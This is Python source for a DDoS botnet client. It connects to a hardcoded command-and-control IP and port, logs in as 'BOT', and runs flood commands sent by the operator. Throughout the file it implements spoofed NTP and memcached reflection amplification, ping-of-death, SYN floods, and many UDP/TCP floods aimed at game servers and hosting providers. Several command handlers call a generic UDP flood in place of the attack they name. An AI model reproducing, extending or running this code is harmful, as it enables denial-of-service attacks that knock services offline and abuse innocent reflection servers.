import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
from struct import pack as data_pack
from multiprocessing import Process
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4
from icmplib import ping as pig
from scapy.layers.inet import UDP
    
COSMC2_ADDRESS  = "87.106.190.187"
COSMC2_PORT  = 10097


ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = f.readlines()
        packets = random.randint(10, 150)
    except Exception as e:
        print(f"Erro: {e}")
        pass

    server = random.choice(ntp_servers).strip()
    while time.time() < timer:
        try:
            packet = (
                    IP(dst=server, src=target)
                    / UDP(sport=random.randint(1, 65535), dport=int(port))
                    / Raw(load=ntp_payload)
            )
            try:
                for _ in range(50000000):
                    send(packet, count=packets, verbose=False)
                    #print('NTP SEND')
            except Exception as e:
               # print(f"Erro: {e}")
                pass
        except Exception as e:
            #print(f"Erro: {e}")
            pass

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, timer):
    packets = random.randint(1024, 60000)
    try:
        with open("memsv.txt", "r") as f:
            memsv = f.readlines()
    except:
        #print('Erro')
        pass
    server = random.choice(memsv).strip()
    while time.time() < timer:
        try:
            try:
                packet = (
                        IP(dst=server, src=target)
                        / UDP(sport=port, dport=11211)
                        / Raw(load=mem_payload)
                )
                for _ in range(5000000):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass

def icmp(target, timer):
    while time.time() < timer:
        try:
            for _ in range(5000000):
                packet = random._urandom(int(random.randint(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
                #print('MEMCACHED SEND')
        except:
            pass

def pod(target, timer):
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass


# old methods --------------------->
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))
        
def attack_udpbypass(ip, port, secs, size=3500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(random.randint(500, 1400))
        s.sendto(data, (ip, dport))

def attack_udpload(ip, port, secs, min_size=500, max_size=1400):
    end = time.time() + secs
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    payloads = [os.urandom(random.randint(min_size, max_size)) for _ in range(16)]

    while time.time() < end:
        dport = random.randint(1, 65535) if port == 0 else port
        data = random.choice(payloads)
        s.sendto(data, (ip, dport))

    s.close()
        
def attack_mcpe(ip, port, secs, size=3500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = b"\x01\x00\x00\x01\x96\xfa\x25\x30\xc4\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x04\xb1\x12\x3a\xd4\x58\x8d\x8f"
        s.sendto(data, (ip, dport))
        
def attack_mcpev2(ip, port, secs, size=3500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(random.randint(500, 1400))
        s.sendto(data, (ip, dport))
        
def attack_udppps(ip, port, secs, size=128):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(min(size, 64))
        for _ in range(1000):
            s.sendto(data, (ip, dport))
        s.close()

def attack_udpfirewall(ip, port, secs, size=4950):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(random.randint(64, size))
        s.sendto(data, (ip, dport))
        s.close()
        
        if random.randint(0, 1):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data1 = random._urandom(int(size/2))
            data2 = random._urandom(int(size/2))
            s.sendto(data1, (ip, dport))
            s.sendto(data2, (ip, dport))
            s.close()

def attack_udpcosmic(ip, port, secs, size=4950):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        cosmic_data = b'\x43\x4f\x53\x4d\x49\x43' + random._urandom(size-6)
        s.sendto(cosmic_data, (ip, dport))
        s.close()

def attack_udpstar(ip, port, secs, size=4950):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        star_data = b'\x2a\x2a\x2a\x2a\x2a' + random._urandom(size-5)
        s.sendto(star_data, (ip, dport))
        s.close()

def attack_gamepps(ip, port, secs, size):
    end = time.time() + secs
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = b'\xff\xff\xff\xff' + os.urandom(size - 4)

    while time.time() < end:
        dport = random.randint(1, 65535) if port == 0 else port
        s.sendto(payload, (ip, dport))

    s.close()


def attack_gameppsv2(ip, port, secs, size):
    end = time.time() + secs
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = b'\xff\xff\xff\xffgetinfo' + os.urandom(size - 12)

    while time.time() < end:
        dport = random.randint(1, 65535) if port == 0 else port
        s.sendto(payload, (ip, dport))

    s.close()

def attack_udpatomic(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        atomic_data = b'\x41\x54\x4f\x4d\x49\x43\x54\x4f\x4d\x49\x43\x54\x4f\x4d\x49\x43\x54\x4f\x4d\x49\x43'
        for _ in range(2000):
            s.sendto(atomic_data, (ip, dport))
        s.close()

def attack_tcpkill(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.send(random._urandom(size))
            s.close()
        except:
            pass

def attack_tcpslow(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ip, port))
            time.sleep(0.1)
            s.send(random._urandom(min(size, 1024)))
            time.sleep(0.1)
            s.close()
        except:
            pass

def attack_tcpstorm(ip, port, secs, size):
    while time.time() < secs:
        try:
            for _ in range(50):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(random._urandom(size))
                s.close()
        except:
            pass

def attack_udptransit(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        transit_data = b'\x4d\x41\x47\x49\x43' + random._urandom(size-5)  # this values is a have (A Payloads Type: ATOMIC in hexed, but this a Trash payload (son métodos con payload basura)
        s.sendto(transit_data, (ip, dport))
        s.close()

def attack_tcpovh(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            ovh_data = b'\x4f\x56\x48' + random._urandom(size-3)
            s.send(ovh_data)
            s.close()
        except:
            pass

def attack_udpovh(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        ovh_data = b'\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x20\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1A\x09\xFA\xBA\x00\x00\x00\x00\x00\x00\x00\x02\x55\x55\x55\x55\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x55\x12\x00\x00\x00\x3C\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(size-20)
        s.sendto(ovh_data, (ip, dport))
        s.close()

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_SYN(ip, port, secs):
    
    while time.time() < secs:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flags = 0b01000000
        
        try:
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
            
            while time.time() < secs:
                s.send(pkt)
        except:
            s.close()

def attack_tup(ip, port, secs, size):
    while time.time() < secs:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
            print('Pacote TUP Enviado')
        except:
            pass

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_vse(ip, port, secs):
    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                b'\x20\x51\x75\x65\x72\x79\x00') # Read more here > https://developer.valvesoftware.com/wiki/Server_queries    
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))


def attack_roblox(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex = "%064x" % ran
            hex = hex[:64]
            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

def attack_junk(ip, port, secs):
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((COSMC2_ADDRESS, COSMC2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '.UDP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 90:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.UDPBYPASS':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.MCPE':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.MCPEV2':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.TCP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                                                
                if command == '.UDPPPS':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 90:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.UDPCOSMIC':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.UDPLOAD':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.UDPSTAR':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.TCPOVH':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                     
                if command == '.UDPFIREWALL':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 90:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.UDPTRANSIT':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.GAMEPPSV2':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.GAMEPPS':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.TCPKILL':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
      
                if command == '.UDPOVH':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        
                if command == '.UDPATOMIC':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    if threads > 100:
                        print("Demasiados threads")
                        return

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.TCPSTORM':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                        
                elif command == '.NTP':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()

                elif command == '.MEM':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()

                elif command == '.ICMP':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()

                elif command == '.POD':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=pod, args=(ip, timer), daemon=True).start()

                elif command == '.TUP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tup, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.HEX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.ROBLOX':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])

                        for _ in range(threads):
                            threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.VSE':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.JUNK':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.SYN':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()                
                
                elif command == 'PING':
                    c2.send('PONG'.encode())

            except:
                break

        c2.close()

        main()

if __name__ == '__main__':
        try:
            main()
        except:
            pass
